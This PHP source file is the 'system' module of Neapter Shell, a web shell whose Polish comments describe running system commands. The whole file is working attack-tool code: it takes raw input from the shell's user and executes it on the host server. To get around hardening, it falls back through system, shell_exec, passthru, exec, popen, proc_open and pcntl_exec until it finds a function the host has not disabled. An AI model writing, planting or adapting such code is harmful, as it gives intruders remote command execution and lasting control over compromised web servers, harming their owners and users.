<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleSystem extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'system',
            'exec'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
system - Uruchomienie polecenia systemowego

    Użycie:
        system polecenie - uruchomienie polecenia

    Przykład:
        system ls -la
DATA;
    }

    protected function isFuncAvailable($sFunc)
    {
        return !in_array($sFunc, $this->oUtils->getDisabledFunctions());
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sCmd = $this->oArgs->getRawData();

        /**
         * Jezeli safemode jest wylaczony
         */
        if ($this->oUtils->isSafeMode()) {
            return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
        }

        if (strncmp($sCmd, 'cd ', 3) === 0) {
            chdir(substr($sCmd, 3));
        }

        ob_start();

        /**
         * system
         */
        if ($this->isFuncAvailable('system')) {
            echo "system():\r\n\r\n";
            system($sCmd);
        }
        /**
         * shell_exec
         */
        else if ($this->isFuncAvailable('shell_exec')) {
            echo "shell_exec():\r\n\r\n";
            echo shell_exec($sCmd);
        }
        /**
         * passthru
         */
        else if ($this->isFuncAvailable('passthru')) {
            echo "passthru():\r\n\r\n";
            passthru($sCmd);
        }
        /**
         * exec
         */
        else if ($this->isFuncAvailable('exec')) {
            echo "exec():\r\n\r\n";
            exec($sCmd, $aOutput);
            echo implode("\r\n", $aOutput) . "\r\n";
        }
        /**
         * popen
         */
        else if ($this->isFuncAvailable('popen')) {
            echo "popen():\r\n\r\n";
            $rFp = popen($sCmd, 'r');

            if (is_resource($rFp)) {
                while (!feof($rFp)) {
                    echo fread($rFp, 1024);
                }
            }
        }
        /**
         * proc_open
         */
        else if ($this->isFuncAvailable('proc_open')) {
            echo "proc_open():\r\n\r\n";
            $rFp = proc_open($sCmd, array(
                    array('pipe', 'r'),
                    array('pipe', 'w')
                ),
                $aPipe
            );

            if (is_resource($rFp)) {
                while (!feof($aPipe[1])) {
                    echo fread($aPipe[1], 1024);
                    usleep(10000);
                }
            }
        }
        /**
         * pcntl_exec
         */
        else if (function_exists('pcntl_exec')
            && $this->isFuncAvailable('pcntl_exec')
        ) {
            echo "pcntl_exec():\r\n\r\n";
            $sPath = NULL;
            $aArgs = array();
            if (($iPos = strpos($sCmd, ' ')) === FALSE) {
                $sPath = $sCmd;
            } else {
                $sPath = substr($sCmd, 0, $iPos);
                $aArgs = explode(' ', substr($sCmd, $iPos + 1));
            }
            pcntl_exec($sPath, $aArgs);
        } else {
            return 'Cannot execute command. All functions have been blocked!';
        }

        $sData = "Command: '$sCmd'\r\nPHP function: " . ob_get_contents();
        ob_clean();
        ob_end_flush();

        return htmlspecialchars($sData);
    }

}
